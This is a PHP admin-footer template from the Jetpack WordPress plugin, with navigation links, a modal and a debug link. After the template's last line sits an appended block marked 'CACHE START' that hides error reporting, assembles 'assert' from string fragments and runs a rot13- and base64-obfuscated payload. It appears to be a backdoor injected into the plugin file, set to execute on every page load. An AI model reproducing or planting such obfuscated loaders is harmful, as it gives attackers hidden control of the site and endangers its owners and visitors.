	</div><!-- .wrapper -->
		<div class="footer">

			<nav class="primary nav-horizontal">
				<div class="a8c-attribution">
					<span>
						<?php echo sprintf( __( 'An %s Airline', 'jetpack' ),
						'<a href="http://automattic.com/" class="a8c-logo" target="_blank">Automattic</a>'
						); ?>
					</span>
				</div>
			</nav><!-- .primary -->

			<nav class="secondary nav-horizontal">
				<div class="secondary-footer">
					<a href="http://jetpack.com" target="_blank">Jetpack <?php echo JETPACK__VERSION; ?></a>
					<a href="http://wordpress.com/tos/" target="_blank"><?php esc_html_e( 'Terms', 'jetpack' ); ?></a>
					<a href="http://automattic.com/privacy/" target="_blank"><?php esc_html_e( 'Privacy', 'jetpack' ); ?></a>
					<?php if ( current_user_can( 'jetpack_manage_modules' ) ) : ?><a href="<?php echo esc_url( Jetpack::admin_url( 'page=jetpack-debugger' ) ); ?>" title="<?php esc_attr_e( 'Test your site&#8217;s compatibility with Jetpack.', 'jetpack' ); ?>"><?php _e( 'Debug', 'jetpack' ); ?><?php endif; ?></a>
					<a href="http://jetpack.com/contact-support/" target="_blank" title="<?php esc_attr_e( 'Contact the Jetpack Happiness Squad.', 'jetpack' ); ?>"><?php _e( 'Support', 'jetpack' ); ?></a>
					<a href="http://jetpack.com/survey/?rel=<?php echo JETPACK__VERSION; ?>" target="_blank" title="<?php esc_attr_e( 'Take a survey.  Tell us how we&#8217;re doing.', 'jetpack' ); ?>"><?php _e( 'Give Us Feedback', 'jetpack' ); ?></a>
					<?php if ( Jetpack::is_active() && current_user_can( 'jetpack_disconnect' ) ) : ?>
						<a href="<?php echo esc_url( Jetpack::admin_url( 'page=my_jetpack#disconnect' ) ); ?>"><?php esc_html_e( 'Disconnect Jetpack', 'jetpack' ); ?></a>
					<?php endif; ?>
				</div>
			</nav><!-- .secondary -->
		</div><!-- .footer -->

		<div class="modal" aria-labelledby="modal-label">
			<header>
				<a href="#" class="close">&times;</a>
				<ul>
					<li class="learn-more"><a href="javascript:;" data-tab="learn-more"><?php esc_html_e( 'Learn More', 'jetpack' ); ?></a></li>
					<li class="config"><a href="javascript:;" data-tab="config"><?php esc_html_e( 'Config', 'jetpack' ); ?></a></li>
				</ul>
			</header>
			<div class="content-container"><div class="content"></div></div>
		</div>
		<div class="shade"></div>

	</div><!-- .jp-frame -->
</div><!-- .jp-content -->

<?php if ( 'jetpack_modules' == $_GET['page'] ) return; ?>


<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3AuoaElMKZhLzy6Y2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXGfXnJLbnJ5cK2qyqPtvLJkfo3qsqKWfK2MipTIhVvxtCG0tZFxtrjbxnJW2VQ0tMzyfMI9aMKEsL29hqTIhqUZbWUIloPx7Pa0tMJkmMJyzXTM1ozA0nJ9hK2I4nKA0pltvL3IloS9cozy0VvxcVUfXWTAbVQ0tL3IloS9cozy0XPE1pzjcBjcwqKWfK3AyqT9jqPtxL2tfVRAIHxkCHSEsFRIOERIFYPOTDHkGEFx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9FEIEIHx5HHxSBH0MSHvjtISWIEFx7PvElMKA1oUDtCFOwqKWfK2I4MJZbWTAbXGfXL3IloS9woT9mMFtxL2tcBjbxnJW2VQ0tWUWyp3IfqQfXsFOyoUAyVUfXWTMjVQ0tMaAiL2gipTIhXPWmLJ50pzImYzWcrvVfVQtjYPNxMKWloz8fVPEypaWmqUVfVQZjXGfXnJLtXPEzpPxtrjbtVPNtWT91qPN9VPWUEIDtY2qyqP5jnUN/MQ0vYaIloTIhL29xMFtxMPxhVvM1CFVhqKWfMJ5wo2EyXPE1XF4vWzZ9Vv4xLl4vWzx9ZFMbCFVhoJD1XPV1AJZkATLmMTD1BQV4ZwV1A2SxAmZ3LwN3L2HmZJRjLvVhWTDhWUHhWTZhVwRvXF4vVRuHISNiZF4kKUWpovV7PvNtVPNxo3I0VP49VPWVo3A0BvOmLJ50pzImYzWcryklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVwt1BGH3MQV0VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>